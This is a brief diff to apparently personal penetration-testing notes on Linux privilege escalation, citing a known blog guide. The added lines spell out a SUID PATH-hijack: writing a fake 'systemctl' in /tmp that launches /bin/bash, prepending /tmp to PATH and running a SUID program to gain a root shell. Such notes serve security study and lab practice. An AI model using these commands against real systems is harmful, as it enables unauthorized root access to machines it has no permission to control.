@@ -2,3 +2,11 @@ https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ - All there i
 
 a user can run a file in sudo?
 spawn tty and run 'sudo -S ./script.sh'
+
+SUID PATH VARIABLE:
+What system programs is it running (Try to use hex/cat)? IE: systemctl:
+cd /tmp
+echo "/bin/bash" > systemctl
+chmod 745 systemctl
+export PATH=/tmp:$PATH
+./SUIDSCRIPT = profit 
